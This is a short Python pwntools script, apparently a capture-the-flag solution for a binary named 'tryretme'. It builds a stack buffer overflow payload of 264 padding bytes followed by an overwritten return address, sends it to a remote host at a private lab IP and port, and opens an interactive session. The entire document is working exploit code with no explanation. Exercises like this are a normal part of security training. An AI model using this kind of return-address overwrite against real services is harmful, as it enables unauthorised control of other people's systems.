from pwn import *

payload = b"A" * 264
payload += p64(0x00000000004011e2)

# p = process("./tryretme")

p = remote("10.10.104.183", 9006)

p.sendlineafter(b":", payload)
p.interactive()
